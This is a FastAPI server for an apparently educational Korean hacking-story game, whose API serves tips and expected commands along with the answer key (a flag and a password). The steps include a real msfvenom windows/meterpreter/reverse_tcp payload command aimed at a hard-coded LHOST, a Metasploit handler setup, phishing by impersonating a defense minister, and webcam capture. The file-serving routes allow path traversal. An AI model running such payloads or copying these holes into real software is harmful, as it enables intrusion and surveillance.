# -*- coding: utf-8 -*-
from fastapi import FastAPI, Response, Request
import uvicorn
import os
import sys
from fastapi.responses import StreamingResponse, FileResponse, HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
import json

app = FastAPI()

app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

@app.get("/")
async def root(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})

@app.get("/feed")
async def feed(request: Request):
    return templates.TemplateResponse("feed.html", {"request": request})

@app.get("/log/{cmd}")
async def steps(cmd: str, request: Request):
    ip = request.client.host
    f = open('log', 'a')
    f.write(f'{ip}: {cmd}\n')
    f.close()
    return 'ok'

@app.get("/view_log")
async def viewlog(request: Request):
    f = open('log', 'r')
    log = f.read()
    f.close()
    logs = log.split('\n')
    return templates.TemplateResponse("log.html", {"request": request, "logs": logs})

@app.get("/video/{file_path}")
async def main(file_path: str):
    PATH = 'video'
    vid_path = os.path.join(PATH, file_path)
    return FileResponse(vid_path, media_type="video/mp4")

@app.get("/file/{file_path}", response_class=FileResponse)
async def main(file_path: str):
    PATH = 'file'
    return os.path.join(PATH, file_path)

@app.get("/api/{type}")
def api(type: str):
    resp = {'count':['0','1','2','2','1','2','7','2','1','1','1','2','3','2','1'],
    'tip': ['그런거 없다.',
    'TIPS\n""안에 있는 명령어는 <>안에 내용을 읽고 그것으로 대체해서 입력해줘!\n예시) user가 decode, url이 sv.m03.pw, port가 100이라면 만약 "ssh <USER>@<URL> -p <PORT>"이렇게 치라고 하면 밑의 명령줄에 ssh decode@sv.m03.pw -p 100 이라고 입력하라고... 한번 해보자..\n',
    '우리가 울랄라 대장의 이메일 주소를 알아냈어.\n이 주소로 백도어가 심어진 PPT파일을 보내야 해.\n먼저 PPT파일에 백도어를 심어보자.\n백도어를 만들때에는 Metasploit를 사용합니다.\n먼저, 자신의 IP를 알아내자! 어떻게 해야 할까?? "ipconfig"를 치면 나올꺼야!! 그리고 만약 정답을 모르겠으면 "show_ans"를 치면 위에 답이 나와! \n',
    '백도어를 만들어 보자! METASPLOIT이라는 프로그램은, 백도어가 심어진 파일을 만들 수 있게 해줘. METASPLOIT은 msfvenom라는 명령어로 확인할 수 있습니다! 이제 Metasploit을 사용하는 법을 알아야 겠지? 어떤 명령어의 도움말을 알기 위해서는 "man <명령어>"라는 명령어를 사용해. 기억해 두자! 이제 사용법을 알아볼까? msfvenom 사용법은 "man msfvenom"을 치면 알 수 있겠지?',
    '이제 백도어를 만들어야 겠지? 동영상에서 알려준 대로 백도어 파일을 만들어 보자! 우리가 쓸 페이로드는 windows/meterpreter/reverse_tcp야!\n\n"msfvenom -p windows/meterpreter/reverse_tcp LHOST=144.13.135.13 LPORT=2031 -f PPT > back.PPT"으로 back.exe라는 파일을 만들자! 게임 실행파일이 있는 곳과 같은 곳에 만들어 질거야!',
    '''울랄라 대표의 이메일은 gshsdecode@gmail.com이야.
여기에 만든 파일을 보낼 건데 대표가 이메일의 내용물을 다운받을 수 있게끔 낚시성 내용을 적어야겠지?
국방부 장관인척하고 보내도 되고 어그로를 끌 수 있는 자극적인 내용을 보내도 돼.
이후 답장을 받고 백도어가 작동하는지 확인해보자! 백도어는 msfconsole이라는 명령어로 실행할 수 있어! 도움말을 보자! "man msfconsole"''',
    '좋아 이제 대충은 알겠지? 영상에서 알려준 대로 메타스플로잇 핸들러를 실행시켜보자!(형식: msf use exploit/multi/handler)',
    '이제 그 동영상을 녹화해서 유포하자!\n어디에다가 유포하할까??\n\n그래! 근처의 모든 사람들에게 문자를 보내자! 어떻게?? [긴급재난문자]로 할 수 있겠지?\n긴급재난문자는 일반 문자와 비슷한 원리야. 대신에 일반 휴대폰도 수신할 수 있도록 조금 다른 전송 방식을 사용하는데, 너무 복잡하니까 생략하도록 할께. 하지만, 이건 알아둬, 결국 기지국에서 보낸다는 걸.\n"cellbroad_attack"을 입력하면 공격할 수 있어!!',
    '어라??????? 울랄라의 김대표가 우리를 공격한다고 한게 사실이였어! 김대표의 해커들은 어떤 방법으로 공격을 해올까?? "openvideo"로 한번 알아보자!',
    '퀴즈를 풀어 해킹을 막아보자! "openweb"',
    '퀴즈를 풀어서 나온 코드를 입력해 보자! 그리면 김대표의 해킹을 막을 수 있어!!',
    '저쪽에서는 지금쯤 공격에만 정신이 팔려서 방어에는 신경을 못 쓰고 있을거야.\n이 틈을 타서 포투리스들의 상징인 P-core를 제거하자.\n먼저 P-core를 관리하고 있는 기관의 서버에 침투하자.\n처음에 사용했었던 백도어를 쓸거야,\n아까 해봤으니깐 혼자 할 수 있을거야.\n"msfconsole pcore"을 입력하자!',
    '이건 실행파일이 인간이 알아볼 수 없게 되어 있는 파일이야. 이 파일은 도저히 읽을 수가 없으니 우리가 읽을 수 있는 소스코드로 복구해 보자. decompile을 이용해봐. "decompile <파일명>"',
    '좋아 이제 P-core를 보호하고 있던 시스request: Request템을 제거 했어.\n이건 P-core를 관리하는 시스템이야.\n먼저 관리자의 패스워드를 입력해야해.\n패스워드는 아까 보호 시스템 파일에 있어.\n',
    '좋아, 성공했어 곧 P-core가 폭파할거야!!!\n 으아ㅏ 잠시만 지금 경찰이 왔나봐\n 우리는 지금 도망갈거니 너도 빨리 도망가!!',
    ''
    ],
    'new_tip': ['',
    ['그래.. 이렇게만 하자.... 다음 단계로 넘어가'],
    ['좋아! IP주소를 알아냈지? ip 주소를 입력창에 적어보자. 그리고 그 컴퓨터의 포트번호는 2031이야.','좋아 이 IP주소랑 포트번호를 기억하고 있자! 백도어는 METASPLOIT이라는 프로그램으로 실행할 수 있어! Next_Step'],
    ['도움말을 읽어보고 무엇을 해야 할지 생각해 보자! 근데 페이로드는 뭐고, msfvenom은 뭐지..? "openvideo"를 치고 영상을 보고 다음 단계로 넘어가자!','sys:run explorer http://sv.m03.pw/video/p01.mp4'],
    ['이제 다운로드 폴더에 EXE파일이 생성되었겠지?? 다음단계로 넘어가서 이 파일을 보내보자!'],
    ['이제 msf콘솔을 사용할 수 있어!\n원격제어를 하기위한 방법을 알기전에 영상을 보자. 어떤 명령어를 입력해야 하지? "openvideo" \n\n영상을 본 후에 다음 단계로 넘어가자\n','sys:run explorer http://sv.m03.pw/video/p02.mp4'],
    ['좋아 다목적 핸들러를 실행했어! 이제 페이로드를 세팅하자 아까 사용한 페이로드가 뭐였지? "set payload windows/meterpreter/reverse_tcp"','페이로드도 세팅되었으니 IP를 입력 해야겠지?(<명령어> LHOST=<IP>형식으로 입력하자)','포트번호도 입력해야지? LPORT=<포트>','이제 상대컴퓨터와 우리 컴퓨터의 연결이 끊어졌을 때를 대비해 우리 PC가 상대의 연결을 상시 대기할 수 있도록 하는 작업이 필요해. ExitONsession false라는 명령어를 세팅하면 그 기능을 실행할 수 있어.','좋아! 이제 그 컴퓨터는 너의 것이야! 이제 우리는 카메라를 켜야겠지? 카메라에서 영상을 가져오는 명령어는 getcam이야. 어떻게 사용하는 건지 도움말을 보자!','\n동영상을 가져와보자!\n','sys:run explorer http://sv.m03.pw/video/01.mp4'],
    ['좋아! 전송됐어!! 이제 많은 사람들이 진실을 알게 될거야!!!!!! 뉴스를 한번 볼까?? "openvideo"','sys:run explorer http://sv.m03.pw/video/02.mp4'],
    ['sys:run explorer http://sv.m03.pw/file/csrf.pdf'],
    ['sys:run explorer http://self.m03.pw/quiz.html'],
    ['좋아!!! 이제 우리는 반격을 할 차례이지!!!! 다음 단게로 넘어가서 김대표와 울랄라를 공격하자!!!'],
    ['잘했어 우리가 서버에 침투한 걸 아직 저쪽에서는 모르고 있는 거 같아.\n이제 P-core를 보호하고 있는 시스템을 제거해보자.\n이게 보호 시스템 파일 위치야 파일을 열어보자.\n\n파일을 열려면 그 파일이 있는 폴더로 가야하는데 “cd <폴더이름>”를 이용하면 돼 폴더이름은 P-core야.\n','파일 protect_system.cpp을 열어서 확인해보자. "open <파일명>"\n','어라?? 이상하네..어떻하지?? 다음 단계로.'],
    ['이제 디컴파일한 파일을 읽어보자! 디컴파일한 파일의 이름은 protect_system.decom 이야. 읽으려면 어떤 명령어를 써야 했지?? "open <파일명>"','이 코드에서 변수 값을 바꿔서 제대로 작동하지 못하게 하자. 보호 시스템 가동을 멈출려면 Pcore_T의 값을 어떻게 바꾸어야 할까?','좋아!! 다음 단계로'],
    ['"operate <이름> self-destruct"를 명령해서 P-core의 자폭장치를 작동시키자.','sys:run explorer http://self.m03.pw/boom.html'],
    ['']
    ],
    'cmd': ['',
    ['ssh decode@sv.m03.pw -p 100'],
    ['ipconfig','144.13.135.13'],
    ['man msfvenom','openvideo'],
    ['msfvenom -p windows/meterpreter/reverse_tcp LHOST=144.13.135.13 LPORT=2031 -f PPT > back.PPT'],
    ['man msfconsole', 'openvideo'],
    ['msf use exploit/multi/handler','set payload windows/meterpreter/reverse_tcp', 'set LHOST=144.13.135.13', 'set LPORT=2031', 'set ExitONsession false','man getcam','getcam'],
    ['cellbroad_attack','openvideo'],
    ['openvideo'],
    ['openweb'],
    ['DECODE{You_C0mpl3t3d_sq1_qu1z}'],
    ['msfconsole pcore','cd P-core','open protect_system.cpp'],
    ['decompile protect_system.cpp','open protect_system.decom','100'],
    ['dEcodE36#','operate P-core self-destruct'],
    ['']
    ]}
    data = json.dumps(resp[type])
    return data

if __name__=="__main__":
    uvicorn.run('main:app', host='0.0.0.0', port=80, debug=True, reload=True)